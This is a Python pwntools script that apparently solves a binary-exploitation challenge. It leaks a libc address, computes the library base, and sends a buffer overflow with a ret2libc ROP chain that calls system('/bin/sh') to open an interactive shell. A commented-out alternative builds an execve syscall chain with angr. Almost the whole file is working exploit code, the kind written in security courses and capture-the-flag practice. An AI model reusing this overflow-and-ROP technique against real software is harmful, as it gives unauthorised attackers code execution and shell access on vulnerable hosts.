#!/usr/bin/env python3

# import angr, angrop

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 1234

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
set follow-fork-mode parent
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E, ROP, PROJECT
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

        E = ELF(f"{__file__.replace('_sol.py', '')}")

        # PROJECT = angr.Project(f"{__file__.replace('_sol.py', '')}", auto_load_libs=False)
        # ROP = PROJECT.analyses.ROP()
        # ROP.find_gadgets()

######################################
############## Exploit ###############
######################################

def exploit():
    P.recvuntil(b' - ')

    ####################################
    #######      RET2LIBC        #######
    ####################################

    printf_addr = int(P.recvuntil(b" -\n", drop=True), base=16)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc.address = printf_addr - libc.symbols["printf"]
    payload = b'A' * 16

    payload += p64(libc.address + 0x001bc065) # ret
    payload += p64(libc.address + 0x001bbea1) # pop rdi, ret
    payload += p64(libc.address + next(libc.search(b'/bin/sh'))) # /bin/sh
    payload += p64(libc.symbols["system"])

    ####################################
    #######      RET2CODE        #######
    ####################################

    # payload += p64(0x00401195) # pop rax
    # payload += p64(0x3b)
    # payload += p64(0x0040118e) # pop rdi, rsi
    # payload += p64(0x00404028) # &"/bin/sh"
    # payload += p64(0x0)
    # payload += p64(0x00401191) # xor rdx, rdx
    # payload += p64(0x00401197) # syscall

    # binsh_addr = next(PROJECT.loader.memory.find(b'/bin/sh'))
    # ROP.set_regs({'rax': 0x3b, 'rdi': binsh_addr, 'rsi': 0, 'rdx': 0})
    # payload = ROP.dump()
    # print(payload)
    # payload += p64(0x00401197)

    P.sendlineafter(b"ROP!\n", payload)

    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
